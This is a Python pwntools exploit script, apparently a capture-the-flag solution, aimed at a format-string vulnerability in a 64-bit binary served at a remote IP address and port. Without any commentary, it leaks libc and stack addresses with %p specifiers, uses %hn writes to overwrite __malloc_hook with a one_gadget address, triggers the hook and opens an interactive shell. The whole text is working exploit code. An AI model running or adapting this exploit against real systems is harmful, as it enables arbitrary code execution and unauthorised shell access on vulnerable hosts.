from pwn import *
import time
context.binary = ELF('./fmt64')
context.log_level = 'debug'
elf = context.binary
libc = elf.libc


def dbg():
	gdb.attach(p, 'codebase')
	raw_input()

#p = process('./fmt64')
p = remote('47.106.94.13', 50010)

leak_load = '%46$p'
p.recvline()
p.sendline(leak_load)
leak = int(p.recvline().strip('\n'), 16) - 240
libc.address = leak - libc.symbols['__libc_start_main']
malloc_hook = libc.symbols['__malloc_hook']

hook_low = malloc_hook & 0xffff
hook_mid = (malloc_hook & 0xffff0000) >> 16
hook_high = (malloc_hook & 0xffff00000000) >> 32

payload = '%41$p'
time.sleep(1)
p.sendline(payload)
stack_addr = int(p.recvline().strip('\n'), 16) + 0x110
print "stack_addr ==> ", hex(stack_addr)


stack_low = stack_addr & 0xffff
stack_mid = stack_low + 2
stack_high = stack_mid + 2

payload = '%{}c%41$hn'.format(stack_low)
payload += '%{}c%48$hn'.format(2)
payload += '%{}c%62$hndead'.format(2)
time.sleep(1)
p.sendline(payload)

#write malloc_hook to stack
if (hook_low < hook_mid) and (hook_mid < hook_high):
	payload = '%{}c%43$hn'.format(hook_low)
	payload += '%{}c%74$hn'.format(hook_mid - hook_low)	
	payload += '%{}c%76$hn'.format(hook_high - hook_mid)

elif (hook_mid < hook_low) and (hook_low < hook_high):
	payload = '%{}c%74$hn'.format(hook_mid)
	payload += '%{}c%43$hn'.format(hook_low - hook_mid)	
	payload += '%{}c%76$hn'.format(hook_high - hook_low)
elif (hook_mid < hook_high) and (hook_high < hook_low):
	payload = '%{}c%74$hn'.format(hook_mid)
	payload += '%{}c%76$hn'.format(hook_high - hook_mid)	
	payload += '%{}c%43$hn'.format(hook_low - hook_high)
else:
	print "wrong"
	p.close()

p.recvuntil('dead')

payload += 'jail'
p.sendline(payload)

gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
gad = gadgets[1] + libc.address

gad_low = gad & 0xffff
gad_mid = (gad & 0xffff0000) >> 16

payload = '%{}c%77$hnbail'.format(gad_low) + '\x00'
p.recvuntil('jail')
p.sendline(payload)

payload = '%{}c%43$hntree'.format(hook_low+2)  + '\x00'
p.recvuntil('bail')
p.sendline(payload)

payload = '%{}c%77$hnbacker'.format(gad_mid)  + '\x00'

p.recvuntil('tree')
p.sendline(payload)

p.recvuntil('backer')
p.sendline('%7065$x\x00')

p.interactive()
p.close()